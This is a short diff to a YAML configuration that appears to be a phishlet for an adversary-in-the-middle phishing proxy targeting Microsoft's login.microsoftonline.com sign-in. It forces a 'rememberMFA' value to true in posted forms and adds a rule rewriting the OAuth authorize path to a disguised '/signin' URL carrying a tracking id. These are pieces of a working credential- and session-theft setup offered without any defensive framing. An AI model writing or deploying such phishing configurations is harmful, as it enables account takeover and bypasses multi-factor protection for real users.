@@ -72,3 +72,14 @@ force_post:
     force:
       - {key: 'rememberMFA', value: 'true'}
     type: 'post'
+
+rewrite_urls:
+  - trigger:
+        domains: ['login.microsoftonline.com']
+        paths: ['/common/oauth2/v2.0/authorize']
+    rewrite:
+        path: '/signin'
+        query:
+          - key: 'boop'
+            value: '{id}'
+        exclude_keys: ['client_id']
